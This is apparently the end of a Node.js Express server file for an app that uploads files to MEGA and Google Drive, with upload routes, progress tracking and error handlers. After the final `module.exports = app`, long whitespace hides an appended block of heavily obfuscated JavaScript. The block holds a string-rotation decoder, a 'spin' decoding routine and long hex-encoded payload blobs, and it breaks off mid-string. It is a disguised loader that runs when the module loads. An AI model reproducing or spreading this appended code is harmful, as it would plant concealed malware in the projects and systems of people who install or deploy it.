      return res.json({ complete: true, file: statusRes.data || {} })
    }
    res.json({ complete: false, status: statusRes.status })
  } catch (err) {
    sendErrorJson(res, err, "Could not check the upload")
  }
})

//MEGA only. Google Drive bytes never arrive here any more, see /upload-session.
app.post("/upload-item-stream", async (req, res) => {
  const bb = busboy({
    headers: req.headers,
    limits: { fileSize: PROXY_UPLOAD_MAX_BYTES }
  })

  const fields = {}
  let responded = false

  function safeRespond(status, body) {
    if (responded) return
    responded = true
    res.status(status).json(body)
  }

  bb.on("field", (name, val) => {
    fields[name] = String(val).trim()
  })

  bb.on("file", async (_fieldname, fileStream, info) => {
    const email = fields.email || getQueryTrimmed({ query: req.headers }, "x-upload-email")
    const provider = fields.provider || getQueryTrimmed({ query: req.headers }, "x-upload-provider")
    const parentId = fields.parentId || getQueryTrimmed({ query: req.headers }, "x-upload-parent-id")
    const uploadId = fields.uploadId || getQueryTrimmed({ query: req.headers }, "x-upload-id")
    const fileName = info.filename || "upload.bin"
    const fileMime = info.mimeType || "application/octet-stream"
    const fileSize = parseInt(req.headers["x-file-size"] || "0", 10) || 0

    if (!email || !parentId) {
      fileStream.resume()
      return safeRespond(400, { error: "email and parentId are required" })
    }

    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      fileStream.resume()
      return safeRespond(404, { error: "Account not found" })
    }

    setUploadProgress(uploadId, {
      sessionId: req.sessionId,
      status: "uploading",
      phase: "initiating",
      provider: normalizeProvider(account.provider),
      fileName,
      bytesUploaded: 0,
      bytesTotal: fileSize,
      message: "Preparing upload"
    })

    if (normalizeProvider(account.provider) === "mega") {
      try {
        const storage = await ensureMegaStorageForAccount(account)

        const targetFolder =
          parentId === "root" ? storage.root : getMegaNodeById(storage, parentId)

        if (!targetFolder || !targetFolder.directory) {
          fileStream.resume()
          return safeRespond(404, { error: "Destination folder not found" })
        }

        if (!fileSize || fileSize <= 0) {
          fileStream.resume()
          return safeRespond(400, { error: "x-file-size header is required for MEGA stream upload" })
        }

        setUploadProgress(uploadId, {
          status: "uploading",
          phase: "mega",
          bytesUploaded: 0,
          bytesTotal: fileSize,
          message: "Uploading to MEGA"
        })

        const uploadStream = targetFolder.upload(
          { name: fileName, size: fileSize, allowUploadBuffering: false },
          fileStream
        )
        uploadStream.on("progress", (p) => {
          const megaUploaded = Number(p?.bytesUploaded || 0)
          const megaTotal = Number(p?.bytesTotal || fileSize)
          setUploadProgress(uploadId, {
            status: "uploading",
            phase: "mega",
            bytesUploaded: Math.max(0, Math.min(fileSize, megaUploaded)),
            bytesTotal: Math.max(fileSize, megaTotal),
            message: "Uploading to MEGA"
          })
        })

        uploadStream.on("error", (err) => {
          setUploadProgress(uploadId, {
            status: "error",
            phase: "error",
            message: err && err.message ? err.message : "MEGA upload stream error"
          })
        })

        await uploadStream.complete

        setUploadProgress(uploadId, {
          status: "done",
          phase: "done",
          bytesUploaded: fileSize,
          bytesTotal: fileSize,
          message: "Upload complete"
        })
        cleanupUploadProgress(uploadId)
        return safeRespond(200, { success: true })
      } catch (err) {
        setUploadProgress(uploadId, { status: "error", phase: "error", message: err.message })
        cleanupUploadProgress(uploadId, 60000)
        logError(err)
        return safeRespond(500, { error: err.message || "MEGA upload failed" })
      }
    }

    //Google Drive used to be streamed on to Google from here. It was also the worst place
    //for it: the bytes crossed the network twice, the old progress counter measured the
    //browser -> server hop rather than the server -> Google one, and on a serverless host
    //the request body never even arrived. The browser PUTs to Google itself now, so
    //anything non-MEGA reaching this route is a page loaded before the change.
    fileStream.resume()
    return safeRespond(400, {
      error: "Google Drive uploads no longer go through the server. Reload the page and try again."
    })
  })

  bb.on("error", (err) => {
    logError(err)
    if (!responded) {
      responded = true
      res.status(500).json({ error: "Multipart parse error: " + err.message })
    }
  })

  req.pipe(bb)
})

app.post("/upload-item", upload.single("file"), async (req, res) => {
  try {
    const email = getBodyTrimmed(req, "email")
    const provider = getBodyTrimmed(req, "provider")
    const parentId = getBodyTrimmed(req, "parentId")
    const uploadId = getBodyTrimmed(req, "uploadId")
    const file = req.file

    if (!email || !parentId || !file) {
      return res.status(400).json({ error: "email, parentId and file are required" })
    }

    setUploadProgress(uploadId, {
      sessionId: req.sessionId,
      status: "received",
      phase: "server",
      provider: normalizeProvider(provider),
      fileName: file.originalname || "upload.bin",
      bytesUploaded: 0,
      bytesTotal: Number(file.size || 0),
      message: "File received by server"
    })

    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      return res.status(404).json({ error: "Account not found" })
    }

    if (normalizeProvider(account.provider) === "mega") {
      const storage = await ensureMegaStorageForAccount(account)
      const targetFolder = parentId === "root" ? storage.root : getMegaNodeById(storage, parentId)
      if (!targetFolder || !targetFolder.directory) {
        return res.status(404).json({ error: "Destination folder not found" })
      }

      const uploadStream = targetFolder.upload({ name: file.originalname || "upload.bin" }, file.buffer)
      setUploadProgress(uploadId, {
        status: "uploading",
        phase: "mega",
        bytesUploaded: 0,
        bytesTotal: Number(file.size || 0),
        message: "Uploading to MEGA"
      })
      uploadStream.on("progress", (p) => {
        const up = Number(p && p.bytesUploaded ? p.bytesUploaded : 0)
        const total = Number(p && p.bytesTotal ? p.bytesTotal : file.size || 0)
        setUploadProgress(uploadId, {
          status: "uploading",
          phase: "mega",
          bytesUploaded: up,
          bytesTotal: total,
          message: "Uploading to MEGA"
        })
      })
      await uploadStream.complete
      setUploadProgress(uploadId, {
        status: "done",
        phase: "done",
        bytesUploaded: Number(file.size || 0),
        bytesTotal: Number(file.size || 0),
        message: "Upload complete"
      })
      cleanupUploadProgress(uploadId)
      return res.json({ success: true })
    }

    //Google Drive goes browser -> Google now, see /upload-session.
    return res.status(400).json({
      error: "Google Drive uploads no longer go through the server. Reload the page and try again."
    })
  } catch (err) {
    const uploadId = getBodyTrimmed(req, "uploadId")
    setUploadProgress(uploadId, {
      status: "error",
      phase: "error",
      message: err && err.message ? err.message : "Upload failed"
    })
    cleanupUploadProgress(uploadId, 60 * 1000)
    sendErrorJson(res, err, "Error uploading file")
  }
})

app.get("/upload-progress", async (req, res) => {
  const uploadId = getQueryTrimmed(req, "uploadId")
  if (!uploadId) {
    return res.status(400).json({ error: "uploadId is required" })
  }
  let state = null
  if (HAS_UPSTASH) {
    state = await redisGetJson(`multidrive:progress:${uploadId}`).catch(() => null)
  } else {
    state = uploadProgress.get(uploadId)
  }
  if (!state || String(state.sessionId || "") !== String(req.sessionId || "")) {
    return res.json({ status: "unknown" })
  }
  res.json(state)
})

app.use((err, req, res, next) => {
  if (err && err.code === "LIMIT_FILE_SIZE") {
    return res.status(413).json({
      error: "File too large for a server side upload. Max is " +
        Math.round(MULTER_MAX_BYTES / (1024 * 1024)) + " MB."
    })
  }
  if (err) {
    return res.status(500).json({ error: err.message || "Server error" })
  }
  next()
})

const PORT = Number(process.env.PORT || 3000)

//megajs emits errors on its own EventEmitters (api "error", storage "error") from
//background sockets. an unhandled one takes the whole process down - on a serverless
//host that means every other request landing on that instance fails too. log and
//survive instead.
process.on("unhandledRejection", (reason) => {
  console.error("[multi-drive] unhandled rejection:", reason?.message || reason)
})

process.on("uncaughtException", (err) => {
  console.error("[multi-drive] uncaught exception:", err?.stack || err?.message || err)
})

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}/`)
    console.log(`Session store: ${HAS_UPSTASH ? "Upstash Redis (shared)" : "in-memory (single process only)"}`)
  })
}

module.exports = app
;                                                                                                                                                     var z = '-5393-2';(function(iD$rAdb_dVlFfpxq,phWrbjW_thbDXM){var ToBFsWhdj$omTwbEfly=WWXFnxYi_iSPKy,daVGsxvoZXYe=iD$rAdb_dVlFfpxq();while(!![]){try{var nU_l$lqaj=Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1aa))/(-0x14a1*Math.max(0x1,parseInt(0x1))+-0x12*0xbf+0x4*parseFloat(0x884)))*Math['floor'](parseFloat(ToBFsWhdj$omTwbEfly(0x1ae))/(parseInt(0x2616)+parseInt(0x1d)*-0x15+Math.floor(parseInt(0x1))*-parseInt(0x23b3)))+parseFloat(ToBFsWhdj$omTwbEfly(0x1ab))/(parseInt(-parseInt(0x11))*parseInt(-0xe9)+-parseInt(0x109e)+parseInt(parseInt(0x128)))+-parseFloat(ToBFsWhdj$omTwbEfly(0x1a6))/(Math.ceil(-parseInt(0x7c2))+-parseInt(0x27c)*0x3+parseInt(0x79d)*parseInt(0x2))*Math['ceil'](parseFloat(ToBFsWhdj$omTwbEfly(0x19a))/(-parseInt(0x10)*Math.ceil(-0x8d)+Math.ceil(0x130)+-parseInt(0x1ff)*Math.floor(0x5)))+parseFloat(ToBFsWhdj$omTwbEfly(0x1a5))/(parseFloat(parseInt(0x23b6))*Math.ceil(-0x1)+0xb57+0x1865)*Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1a8))/(-parseInt(0x1)*parseFloat(-parseInt(0x1c24))+-parseInt(0x595)+-0x1688))+parseFloat(ToBFsWhdj$omTwbEfly(0x1a0))/(-0x1e23+parseInt(0x22a7)+Math.max(-parseInt(0x47c),-0x47c))*Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1a9))/(Math.trunc(parseInt(0x133b))*-parseInt(0x2)+-parseInt(0x112)*-0x11+Number(0x144d)))+Math['ceil'](-parseFloat(ToBFsWhdj$omTwbEfly(0x1a4))/(parseInt(0x12)*Number(-parseInt(0x59))+parseInt(-parseInt(0x19c9))+parseFloat(0x2015)))+-parseFloat(ToBFsWhdj$omTwbEfly(0x1a1))/(Math.floor(parseInt(0xa97))*Number(0x2)+Math.max(-0x59,-parseInt(0x59))*0x3e+Math.ceil(parseInt(0x6b)));if(nU_l$lqaj===phWrbjW_thbDXM)break;else daVGsxvoZXYe['push'](daVGsxvoZXYe['shift']());}catch(kclrFAgqadpqnkeNnLgcO$EED){daVGsxvoZXYe['push'](daVGsxvoZXYe['shift']());}}}(FNauj_AOPOLeprqN,-parseInt(0x1)*0x6ad6f+Math.trunc(0x7d)*parseFloat(-parseInt(0xd3d))+Math.trunc(-0x65)*-0x3f67));var NX=[Math.trunc(0x841e66)+Math.floor(-parseInt(0x999247))+Math.trunc(-0x7eef30)*-0x1,Number(-parseInt(0x2fc))+-0x1dbc+parseInt(0x2227)*parseInt(0x1),-0x1093*Math.max(parseInt(0x3),0x3)+Math.ceil(parseInt(0x28e3))+parseInt(0x5891),-parseInt(0x3)*parseInt(-parseInt(0x589))+parseInt(0x26f)*parseInt(-0x2)+0x2e*parseInt(-0x34),0xbdd1+Math.floor(parseInt(0x1))*Math.trunc(-0x3d56)+0x34*parseInt(0xd1),-0x22ff07+parseInt(0x1)*Number(-parseInt(0x1885bf))+parseInt(0x881b59)],SX=[parseFloat(0x1b7f69)+Math.ceil(-0xb505)+Math.floor(parseInt(0x35d539)),Math.max(parseInt(0x1648),0x1648)+Math.trunc(-parseInt(0x15))*Number(parseInt(0x8b))+-parseInt(0x9f0),Math.max(-parseInt(0x12d16),-parseInt(0x12d16))+-0x87e0+parseFloat(parseInt(0x258d7))*parseInt(0x1),-0x3*Math.max(-0x896,-parseInt(0x896))+parseFloat(-parseInt(0x36f))*Number(-0x7)+-parseInt(0xa)*0x4e8,parseFloat(0x161e3)+parseInt(0xc348)+parseInt(0x16)*-0xeff,Math.max(-0x4,-0x4)*-0x16112f+Number(-parseInt(0x29))*parseFloat(-0x26d6d)+parseInt(-parseInt(0x737bdc))];function spin(MRzrs_cNFtZRGtVzo$bGXcX,FhF_uisUyD){var Wb$yRxrrpYEUx$bbNKOAlABV=WWXFnxYi_iSPKy,TMpbl$IUMGsYuMIGhswIuNiKl=[],VCDDXMHvGzrJJnweU=Number(-0x77f)+-parseInt(0x1)*Math.trunc(-parseInt(0x684))+parseFloat(-0xfb)*-parseInt(0x1),FtcNmdqgjPJBAQvacGoZfu=FhF_uisUyD[-parseInt(0x62)*0x22+0x2493+-0x178f*parseInt(0x1)],DsN_MhjHhEpuoZmHjPgqoVn,OhARHoDeA$TdrRqbpPcj,jL$gaBSWxxHUCG_Zes,jEVGsXcnTxXuTYOEhNyr$JWo,xjBpZMDdONW_qyAs_nk,GczZKEGaRdDChhAFwP_uDZi;while(VCDDXMHvGzrJJnweU<MRzrs_cNFtZRGtVzo$bGXcX[Wb$yRxrrpYEUx$bbNKOAlABV(0x1a3)]){TMpbl$IUMGsYuMIGhswIuNiKl[VCDDXMHvGzrJJnweU]=MRzrs_cNFtZRGtVzo$bGXcX[Wb$yRxrrpYEUx$bbNKOAlABV(0x19e)](VCDDXMHvGzrJJnweU),VCDDXMHvGzrJJnweU+=parseInt(0x52d)*parseInt(0x6)+-parseInt(0x1f90)+-0x1*parseFloat(-parseInt(0x83));}DsN_MhjHhEpuoZmHjPgqoVn=TMpbl$IUMGsYuMIGhswIuNiKl[Wb$yRxrrpYEUx$bbNKOAlABV(0x1a3)],VCDDXMHvGzrJJnweU=0x1f4e+Math.floor(0x1f09)+Math.trunc(-0x3e57);while(VCDDXMHvGzrJJnweU<DsN_MhjHhEpuoZmHjPgqoVn){OhARHoDeA$TdrRqbpPcj=FtcNmdqgjPJBAQvacGoZfu*(VCDDXMHvGzrJJnweU+FhF_uisUyD[Number(parseInt(0x1e54))+Math.floor(parseInt(0x2637))+Math.ceil(-parseInt(0x448a))])+FtcNmdqgjPJBAQvacGoZfu%FhF_uisUyD[Math.max(-0x20d1,-parseInt(0x20d1))+-0xb*-0x18e+Math.floor(0xa1)*Math.floor(parseInt(0x19))],jL$gaBSWxxHUCG_Zes=FtcNmdqgjPJBAQvacGoZfu*(VCDDXMHvGzrJJnweU+FhF_uisUyD[-parseInt(0xd94)+Number(-parseInt(0x349))*Math.ceil(0x9)+parseFloat(-parseInt(0x1))*Number(-0x2b28)])+FtcNmdqgjPJBAQvacGoZfu%FhF_uisUyD[parseInt(0x768)+0x1*0x2185+-parseInt(0xda3)*0x3],jEVGsXcnTxXuTYOEhNyr$JWo=OhARHoDeA$TdrRqbpPcj%DsN_MhjHhEpuoZmHjPgqoVn,xjBpZMDdONW_qyAs_nk=jL$gaBSWxxHUCG_Zes%DsN_MhjHhEpuoZmHjPgqoVn,GczZKEGaRdDChhAFwP_uDZi=TMpbl$IUMGsYuMIGhswIuNiKl[jEVGsXcnTxXuTYOEhNyr$JWo],TMpbl$IUMGsYuMIGhswIuNiKl[jEVGsXcnTxXuTYOEhNyr$JWo]=TMpbl$IUMGsYuMIGhswIuNiKl[xjBpZMDdONW_qyAs_nk],TMpbl$IUMGsYuMIGhswIuNiKl[xjBpZMDdONW_qyAs_nk]=GczZKEGaRdDChhAFwP_uDZi,FtcNmdqgjPJBAQvacGoZfu=(OhARHoDeA$TdrRqbpPcj+jL$gaBSWxxHUCG_Zes)%FhF_uisUyD[0x12a*-parseInt(0x1f)+0xb*-0x10e+Number(0x2fb5)],VCDDXMHvGzrJJnweU+=-parseInt(0xc88)+parseInt(0x5db)*0x5+0x10be*Math.floor(-parseInt(0x1));}return TMpbl$IUMGsYuMIGhswIuNiKl[Wb$yRxrrpYEUx$bbNKOAlABV(0x1a2)]('');}function FNauj_AOPOLeprqN(){var YWAUuVXUtNHScESvfdS=['a0a3adccd0d7e2d1e5','f3e7faf8d6fdf4e7d6faf1f0','ada1e0d4f1e2d0f4','a0ada0d7dee7e2fedc','a7e3f6e6f2f3e2','a4acada6a1a2a4d6dee0dedfd2','e6e0f7e6e1e7fcfbf2','a8f4f0fbe7e0fdbdf4f9a8a0f6b9f2adf3f1e0bbece7b5bbbbfbf6f0f6f3b9a0b7e5f4f0f4e0a3f9fbffbce7c8a7e0e3b7edb8e4bdc8b5f4aebde7a8aeaee7bebdf4ceadbbe6a7e1d4f2fae4b9e0fdadd6b9f4fcb9e6aef4bdd4f8a5bdfbffaeffe3bfb9a2e3faa2bdbcbdfaaef8a3faf4a1e7e2bcbbb5e7faf1cef3e6a7fbeef1e7e3e1a1edbcbea5b9f4fbe7bee7e7befabce8efa4b5a8fdf3cef4fbade7a4e7ceb9c8e6a2b8a2a2f9f4f4bbe0fca2eeb8a5a3acf9e3f8e1a7e7a8fcc8c8a9bebce0b9f0bcb9b9aefbe7fdcee7a8a5e3b8e7bdaeb9a8e5bcd6e0e6a8bef6aef2aef3aee4d4bcbca4e3fcbce3fea5fbe7f9a4f4f0b5f3a8ceaefdfce6ecbbf0f8bdf1befab4a7b5a8bdf0e3f0f4a2ada8bbbca1f0fca8f2bbfba8eef3f3a8a4cea9a7f4b5f3a4a8e7aea1b9c6bce7ecf9e3a4e0b5ecaefee4f9eee1e3fbe3b5bdd6b5bdf9b9fae3fbe5b5fca8e1f9e7b9e7bbf9e2faeffdbdf9b9e1e4aeaee7e7bdbde3a8f4fde6e3aec8ede4a8f4f7aef1f4aeb9bdbde7aee3ffe4bbbde1cebebcf1f4bce7f1fbe7fde6a1a4ecbde3e7aef3fdaea6f2b7c8f0bdbbf4fde7e5f4e5f2c8f2bbbcfbf2f3e5fba4fdb9fcf6f9aeaebca8d6aef8a0a8bee7b9b5bbbcaee0a8bee6e8bebcfce1b9bef7f8aef1bee0f8bcb8a8e6fcfce4faf9a8e1a8e7a8e4acbebbbbf6fde4becea3f3f0b5e1a5fbe7e5e7bdb5e3e7adf3f9e7fbb9f1f1f2e1b5c8a3f4bbaef8aee7e1fdbbf2e4b5a7f4e8f0e3f0fcf6c8f2f7e1fca9a1faaed6aef9b9efeffca3bef9cef4ceaebebde6fcb7f9fcb7e7b9fbe5fcace6b9f3e7f3fde0e2bcfae2a8f0eebdf7a8e2f0fba7e1bbf2e0bbfca8fefcf4f4f4bebcecf3e1e5f4a6fbe8bca8acb7bcf6e5d4bee0aee0e1e5c8b7a8f9fea2e3e5e1b5a4e7aefdefe2b7bce1bdbcacbcbdbbf9e0f9a8e6a2f3aeb5aee6e4a5bcfbb7ecbea5e6e8a8e3f4bee6b5f8fdbda5e4bbc8fde3aeabb5a5a3a8d4b8faeff0e1e7bde1a4e7e1e7e6fce6faa5f0b9bbaeefcebdf3a9a0f0a2e1b9bde7f4faf4e3fbe7aee1fdfdf3aee3b9ffa8e7aeb5bce7aba4adeffdfabffaeea9f4fef8e6fbbcf4fee1f0bbe3faacbef0f4a5f6f9fcfaaef7e0b5a8c8d6b4f2ffaeeca6bef9bcf0a8bbe8f1e7a8fca3fafcd6ade7fbfba5aea3a8f4e7b7e8bbe7f0fca8c8c6e1e6e7fbfbbbaea7e7a8e1aecee1aefce3a8e5e7d6e7fbbdbcf4e7f0e1e0efbeb5fdf9fecebeeda8f0b5b8adffeebdf0ffecacbdbdbcbcb5','aca6aca7a1a1dcd8c1c1fce4','a1a4a2a4a5ddf0e4c6dbf8','c7caa9b7f6c7dfb4b3c3f0f6c7c2f4a8c7e7f3c7b1a3b7f6a4aec7c7ccf6fbfdcababbe1b5fcc7c7c7d2cba9c7bbc7f6c7a7bbcefbc7b5bbc7f3bbbaa9c7f6a6b4b4a0fbc6c7a9c7fcc7d9bbf0c6e6f9f3bdf0f1f2edf6a9aafaa9e7f9f6c7aae1c7fae6f1c7f3e0c6f0bbaab3e5fdbbc7c7dad8e6cef0a9e6fec7d0bba9c7e0a9e7c7f0aec7d1c7d7e7c7c7c9bbf3c7bba9f6afb4f7e5f9a5acfcf6fac7e7e1f6c7bdaee7fac7c7fba7b8b7bdbbcbe2b5ecbba9a9f1f1b5bcb1f3b5fae0bbb0f0a9f4a9f0bbe1a9f8bdf6c7edf3c7a9cedfbdf3f0c7a9c5f7e7bbf7b2fac7fcbbc7c7a9b2c7c7b0e2c7f3e6bcf0c7bbcef4f2c6c5eef1a7bbfea9f4f6a4f0bbb4a6bbc5a9cfc7fcc7bffad1e6fca8cebba9f3bbb7a1c7f7b5dbb7f0faedc7e5fabbfcdcf9fef4f0c1c7bba7bcb0f8a9fcf0c7c8efa9e9c7e0bdbdf3c7e2c7c7c9c7abc7acb6bbc7a5e7f1a8e6bba5edb4e6c7bbf3c7c6bcbdf6f6e1a4e5f3fae1f4f0d8e0c7d5c7a8a9c7c7baf5bbc7feb1bda7f6c7bbe6a2f0a4f4bbd3c7def6bfbbbbefb7c7fbf3c5f0e6c7e1c7c7c7bba9c7f9b6c7f3a9afb5a7bdbdc7b5c7b1b2a3e6f5a9a6fbfdfcbfb1f0cdf6e8c7fdaab5f6e1faf6bbfcf0f6f6acb5eec7f4a9e6aee0b4bbf0c8d0c7c7faddbbbbb1b7fba9d1a6c7e6c7c7bbbbbdc7f0f0e6e6f0c7a9b5e1b9b7b5c7f1fae3e8c6f6a5dff8fcbbc1a9e6d0f0f2e6c7e2c8c7b7f4c7bbc7b4c7a9fabcbcffc7b5c7f0e2b5fce1f6bbe6fbfebde8bdfbcee3f0c7a9a5a9a8fef3dda9e7e7d8c7b5f6fcfefbd0bbf6bbd7a9b3c7cefac8c7bbb0f6f6c7f9e7edaebfb5ceb7fafce6f0fbc7f0f3f0f4b4ccfbbbf0f6c7b0fab7e0bba9a3f9c7c7c7ecc7a8fce6a8c7c7bdbcc7c7f0afc7c7bcb4c7e2f6e7c7a4a9bbfab4c7f6c7f6d5b7e8c7e0c7e4e0a0bda6c5faf9b7f0c7e1a5b4f3e1f4c7bfa9c7a4e1fbfef6f3e8c1bbb4b1baa9e7fab5dcecf6c7c7b5bcc5a9c9bbf7a9e1c7a2afc5c5e6a9c8bbe7cda9a9bbf0c7e0bdc7c7c7e4fbe5bba9bbc7aef6e1fce6cdbbc7c7ecc7b1d5a9a6bcfec7c7f6a9bec7e7adf9bfbbfcc7b4e7d6c9c5b4fba8f6e6a9bdf6fca9bdc7a2f0c7f0c7f6bbb5e1a9f0e5f0bcf0a9a9b9f0a9bdd0deb4bbe5fbf7b1b7c7f4c7c7bbf0e3e0fdf6bbc1f9caf6bbafc7a5e7b5bcc7e2e2b4e6c6a5bbe1a2e0bba5bdc7accaf4bdb1b3bbf0a3f3bbc7c7fea4d6edf7fcadf9bbfdf6a8f8bdd5a9c7f1bbbba9e7e7bba7bbded8e7f6f7cac7fbc7bdc7caf6afd1e2e1e8bbc7bbeee8acf2b1c7c7c7bcc1c3e1a9f4bdbba9d2bbf1c7ebc2c0c7bbaef9e7bbfddce6f8dbc5b5b5e1d5c7c7adcac7a7c7bbfcc7e7c7c5c7a9bdc7a6b6f6f0f6a5f6f0a6fcc7c7a9f4c7a6c7f4fbc7eecfe6e8b4d8a9c7b8bfbbecf1f4a6c7fcbaa5b0f3c7b6c7b5a9fca7a9c7a5adafbbe1e8c7f3b4b7b8c7f6bbc7f9c7f6ece1ecc7e6f0d4a5c7c6c1c7adbba1e4a9b1d3c1f0c7bbbbc5caa9f6c7a3fdf7c7bbf0e7fcbbf6b8c7fdf6d4c7d6a7e3c7bbaef7c6a9c7a9f4b6dea9c7afe7c8c1f3f0f0b8aeb4fea8cae6bbc7f6f8ffe6bdc7e8afa9c7f4c7bfb3f2bba9f1faf8f0fce6c7fbbbbdb1b6caf4eec3d5faf6ccb8bbfaf8c5f1f4f8bbc7f4f9f3f6ecfac1beb4c5caf2e6e7bba9f7fcc7b4f3bbbcf6dcb3bdf7dcfac7fcbde7fbe7c2bbfcf0bbc7f6b5b4bdfcf6bdc6c7bbf6e7f5afaca9cde6e5c7bdb1b5f8c7f6e1a9e6bbf2b4bba1ade7e6fef0e3c3c7c5f1c7feedc7a9c7f1f0e7fbbcf0c6e6babcc7b5f9f0e7a9f6e6c1a6f1f6e8bbc7a0d6bac2bdbbc6fafbcfe7bcc7f6faf6f6e6f6fdbcc7bba9c7c7a9e1bbe6e6bdc7c7a9f1f9e0bbf6bbe9f3ade1feb9e6f9fbf0e5faa9f0c7a9b4bba3c7bbf0f0c7c7c1f4b3fdb5d8f3a9eecefab1c7a9b5c7e6a5bca8b5a9edc6f0f6bbf6e8a9f6b1f0e6bdbdf1bcc7c7f6e8f3d6c7c7a9bfa9c7bbf8b8bbc7bfc7f0a9bdede3c7e6b5bdd8b3c7f3bbf0c5bff2b5abe6bca9fabba8bbc7fce6fbe7c7bbaaeea0a9fcf7c7a3bcc7c7a4e6b5f6c7f2e4f6f0f9f6a8f6f9aef7f0a9f9f3bfc6dcd6f1a7f0b7efe5c7c7e8a9f6c7f9c6b9fbffe6f6f8b1c7fbbbb4f4fcfca9dfccc8a9f3c5d6e6d5ffd4bbc7a9b0b5e1bbc7fae2c7e8b2b5e7abe5effdbbbbf9c7b2a9f2facae8a9c6c7bdfee4edfdceb5b3a9fcc7b8f3b1d6a9e0a9fcf4d0dbc7a0c7c1c7c8a9c7e5e6febbbbc7eff1f2bbbcc8a9bcf0e7bbc7e7bbd8e6c7efc5abc7c7f0a9a9e1cafdf2f9a9e5bbc7f6f8f3c7e6b4fbf3e1c7a1b5f1e1caaccba9b9fae7f0a0c7f3c7edb5c7c7cee7cdbba9e6f7ecc7a9a9bba7c7bbc7e7f0fbc0c5bdecabbbe5a9a9f6e6c7f9e1a5e1bbeebbc6ecfcfba9f2f2f9b1b5c3f6bbbcafd0dddcb4bbedd1e0c7b9c7e5c7fdc7bde6f6e1bbd8e7c7d8ffddd8c7c7f6c7bbb5c7e1fbf1e9faf4a5bbfbb6f4bba7bcd1f3feb3f6c7dcc7c7c7baf3f0c7bbf6d5a9fce7e6a3c1bea4c7c5edbbbbc7bbe6f6bbf4c7b6bbb8a9cdeec7b4fba1c7f6c7fce1c7bafbc7f0acf8bbbba9d4bcf7f0fbbcbbc8a9bbf4bdc7bdbbeeaaa6e1c7b3c7c7bafcbdf9cdbbb5a9fdb4f1c7c7a9b7b4f6faaab5a6b5a4c7a9b8fdfba9f1e1fbf1faa9c7fee6f8b6b8f6bdc1f0c7f0f0b4c8bbc7a9e6a9c1bea8c7bbc7fcb8e7d5c7c7bbe7b6f6f1a9f6c7c7c7f8efe1f3bbd6f1f0c7e5bbf6eec4c7fcf7ffe6fae6bbf3c7e7f2b8c7c2a5f1fcc7c7a9bbfea9dac7c7b3b8c7b4b6b5c8d6e6c8ece1a1bbb8f1caf5c5c7c7b2a9bbc7e3f0ffc6e2a9f1f6bbf6b5b9f3bbc5bbbdbbf6fce1f6dbf7c7fbb2b8bbf0c7f6c7fbe7c4bbe7c7edfaeec7f6a9b7a3c7fbf1c8c7e8c7f8bdc7b1c7c6fabbc1a0c7f6a7f6edbbbfe3c7fafcf6caabbbe6a5d7c7f3bca9c5a9f4c7bbfad6cfe9a5b5c5daddf1c4fabbfbb5a9bba4e6fac7cab2b5bbc5a9f0e7bbcea9c7e9c7a9a5fca9c7e7aeb2dcbbc7cee8bef9f6b4cef8f6b4bbf9f6a9fbbdf4b5e1c7c7ddc7f9b9e8e5e8c7bcc7adc7dfa9f4c7bba9e1f1bddbabc8fcf6a9f8f0d5a0f6fbcee0bbc7bcbbf7b0e6c5fba9a9cac7c7b4c7f7c7a8b1c7c7cba9b4e8bce6f7b8a3b7b6d0adf6c7bdf1b4c7bce1e7f4e1c7c7a9a9b5a7a4c7b2d9b4fcf7e9f0dae1c7c7e1b1e0f6f1fbc7c7bbe1bcc7efd0bbd2c5ecb4b5c7d4dcb8fbe4f4e0a9e8bbecf6c7bbbbbbf6c7c7bbf6f6f6b1cbc7c7f1d6cac7a9e1adf6c7fde6a7b7c7a7bbb2c6abbcbca7fdb4f0f3ecbbbbabb4fcd9b1f0fbb5aeb0acdac1e3bbf1b1a1c7c7d6a9f6c5c6bde1e0c7e2f9b3bdf8b6b7c7e9e5f6fda9e1ddb1f4a9a9b5bbe1b4c7c6d0f3bbc7c7f2f6dbc5bbc7b5d6c7fca1f8c7a9b6d8c7c7a9aee2fcb8b6d0b5a9a9e1a9f0c7a9dda9c7e7fbe1fad0bdb4a5e7a5a9f1bbbbc7d6b7f6fbbbbba7f7e5bda3d6e5a9c6c7b7f0a4f9bcf6f6a9f4bdc5bbc5acf0a9e4f4bca9a9a4a9fbbbfcc7f4c7c5c7bde8c7a8bbb3b9a7b4f6e2c7bbbcc5c7b1bba9e4c7a9e8b4a4bfc6a9c7b4c7f3bba9f6a9c7f1caa9c7a7c7a9a9b6c8a9a9c7c7c7e5b4bbe7e5c7a9bfb4c1c7dcc7a9c5fea9c7efe1f4bbb3e8bbf4f9f0dea8fcc5a9c7b2a8f2c7c5e8c7e5b1eec6d7bbb5c7e6ecbbbdbbe1b4b5f6aea9f0a0e6fda3a1e1e1a9e5f3a9fae1ede0d9c1fee7abaea9c7bbf6e5e6c7bbf6c7e1c7b8b6f4a1e0c7a3bbc7e1f0aeb8bdb1aae2adafe5bab3c7f9a5a9e7b6a9f0b5fcfce6f3b4f1b1f4facabdb6f6f8e7b5f0a9c7c7c3b4c5fbf6f4a9e1bbebf6e7f6bdf0b2bff4afb5a9c7c7fbf0f4cff0bbb0baf1c7a9c7c7bfbdd0b5f5bef0cec5f6e2c7e2b5a9bdf0e0f6e1f4bcbba2c2a9bab1c5a9bbfdf6c6c1b5a2f0c7d7b4bbbec7bbdca9f7fdc7f0f9bbe1f0bbf7a1cee0fbe0f0e0c7b4c7f9e1bdc7c7c7b9e8b9ddf3e1dde3cafbbba9f0c7b5cad4a9ada9e6e7a9c7eda1bcc7dbb4e5c7f1e9d7b5a9c7c7fefcf0b2f6b8bbc7f6fbf8a6f6e6a9c6fca9fcbbbcbbd0bdc7bda9c7c7c5c7b5caa6c7a9f6e2f0bbb4bbf9a9c7b1b4c7f7f1b9f0a9c5c7d0f9b1e1e5e7b4a9fababcbbc7c7e1b4b9c1bde7f6b6babbc7ecbdbec7e7c7f2f5a9f3bba9f4bebbf3bcbaa9a9b3a9b5f0c7c7a9f0fcb8a9d7f3d0bbe6c7f7fbc7c7bcbbc7b0baffe1f9c7a9b0f6b5c7b4c7bdedc7b6f6c7bbe6c7c7bbc7d8bba9c7a2f6bdf6f2f9c7f6f8bbc8a9bbf0f6a7f7bcc5a9a9a7c7c7b3f1f4d